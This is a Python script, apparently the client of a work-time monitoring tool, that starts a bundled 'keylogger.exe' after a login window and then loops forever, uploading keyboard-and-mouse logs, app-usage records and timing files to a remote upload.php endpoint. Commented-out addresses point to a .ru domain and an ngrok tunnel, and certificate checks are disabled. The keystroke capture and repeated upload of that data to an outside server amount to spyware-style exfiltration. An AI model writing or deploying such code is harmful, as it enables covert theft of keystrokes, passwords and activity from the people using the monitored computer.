import gui as g
import AppsView as av
import requests
import json
import subprocess
import time
from tkinter.messagebox import showinfo
import os

import pyautogui


def send_file(passwordFile, url):
    global notShow
    headers = {}
    # url = 'http://timeleakinspector.ru/upload.php'
    urll = url + 'upload.php'

    # url =  'https://72b5-188-170-75-185.ngrok-free.app/upload.php'
    file = {'filename': open('keybord_and_mouse'+passwordFile+'.json', 'rb')}
    requests.post(urll, files=file, verify=False)

    file2 = {'filename': open('AppsView'+passwordFile+'.json', 'rb')}
    requests.post(urll, files=file2, verify=False)

    file2 = {'filename': open('work_time'+passwordFile+'.json', 'rb')}
    requests.post(urll, files=file2, verify=False)

    Check = url + 'Eam_dispetcher.php'

    onlineCheck = {
        "key": passwordFile
    }

    files = [
    ]

    resp = requests.request("POST", Check, headers=headers,
                            data=onlineCheck, files=files)
    print(resp)

    

if __name__ == "__main__":
    app = g.App()
    app.mainloop()

    if g.exitApp:

        if g.exitApp == True:
            showinfo(title='Вход', message='Cоединение успешно установлено')
        data = {
            "key": g.passwordFile
        }
        json_string = json.dumps(data, ensure_ascii=False)

        with open("FileKey.json", "w") as json_file:
            json_file.write(json_string)
        p = subprocess.Popen("keylogger.exe", shell=True)

        t = time.perf_counter()

        while True:

            headers = {'Accept': 'application/json'}

            # r = requests.get('http://mvc/upload/command.json', headers=headers)

            s = int(time.perf_counter() - t)
            m = float(s) / 60
            h = float(m) / 60

            dataTime = {
                "hours": round(h, 1),
                "minutes": round(m, 1),
                "seconds": s
            }
            json_string = json.dumps(dataTime, ensure_ascii=False)
            with open("work_time"+g.passwordFile+".json", "w") as json_file:
                json_file.write(json_string)
            
            filename = "work_time"+g.passwordFile+".json"
            if not os.path.exists(filename):
                showinfo(title='Файл', message='файл не был создан')

            av.appsView(g.passwordFile)
            send_file(g.passwordFile, g.loc)
            # print("Часов " + str(round(h, 1)) + " Минут " + str(round(m,2)) + " Секунд " + str(s))
            # keylogger.keylogger()
